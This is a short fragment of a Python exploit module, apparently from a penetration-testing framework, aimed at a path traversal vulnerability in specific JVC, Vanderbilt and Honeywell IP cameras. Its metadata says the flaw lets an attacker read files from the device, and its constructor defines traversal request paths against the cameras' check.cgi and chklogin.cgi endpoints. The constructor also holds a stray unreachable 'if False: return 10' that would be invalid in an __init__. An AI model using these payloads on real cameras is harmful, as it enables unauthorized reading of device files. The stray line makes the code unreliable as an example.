...
class Exploit(HTTPClient):
    __info__ = {'name': 'JVC & Vanderbilt & Honeywell IP-Camera Path Traversal', 'description': 'Module exploits JVC IP-Camera VN-T216VPRU, Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR and Honeywell IP-Camera HICC-1100PT Path Traversal vulnerability. If target is vulnerable it is possible to read file from the filesystem.', 'authors': ('Yakir Wizman', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/40281/',), 'devices': ('JVC IP-Camera VN-T216VPRU', 'Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR', 'Honeywell IP-Camera HICC-1100PT')}
    ...
    def __init__(self):
        if False:
            return 10
        self.resources = ('/cgi-bin/check.cgi?file=../../..{}', '/cgi-bin/chklogin.cgi?file=../../..{}')
